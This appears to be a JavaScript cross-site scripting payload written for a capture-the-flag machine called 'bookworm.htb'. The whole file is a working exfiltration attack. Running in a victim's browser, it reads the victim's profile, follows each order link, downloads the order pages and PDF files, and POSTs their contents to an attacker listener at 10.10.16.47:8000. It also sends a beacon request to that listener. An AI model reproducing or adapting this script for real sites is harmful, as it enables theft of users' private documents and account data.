function get_orders(html_page){
    // Create a new DOMParser instance
    const parser = new DOMParser();
    // HTML string to be parsed
    const htmlString = html_page;
    // Parse the HTML string
    const doc = parser.parseFromString(htmlString, 'text/html');
    // Find all the anchor tags within the table body
    const orderLinks = doc.querySelectorAll('tbody a');
    // Extract the URLs and store them in an array
    const orderUrls = Array.from(orderLinks).map((link) => link.getAttribute('href'));
  
    return orderUrls;
  }
  
  function getDownloadURL(html) {
    // Create a temporary container element to parse the HTML
    const container = document.createElement('div');
    container.innerHTML = html;
  
    // Use querySelector to select the download link element
    const downloadLink = container.querySelector('a[href^="/download"]');
  
    // Extract the download URL
    const downloadURL = downloadLink ? downloadLink.href : null;
  
    return downloadURL;
  }
  
  function fetch_url_to_attacker(url){
    var attacker = "http://10.10.16.47:8000/?url=" + encodeURIComponent(url);
  
    fetch(url).then(
      async response=>{
        fetch(attacker, {method:'POST', body: await response.arrayBuffer()})
      }
    );
  }
  
  function get_pdf(url){
    fetch(url).then(
      async response=>{
          fetch_url_to_attacker(getDownloadURL(await response.text()));
      })
  }
  
  fetch("http://10.10.16.47:8000/?trying")
  fetch("http://bookworm.htb/profile").then(
    async response=>{
      for (const path of get_orders(await response.text())){
        fetch_url_to_attacker("http://bookworm.htb" + path);
        get_pdf("http://bookworm.htb" + path);
      }
    }
  )
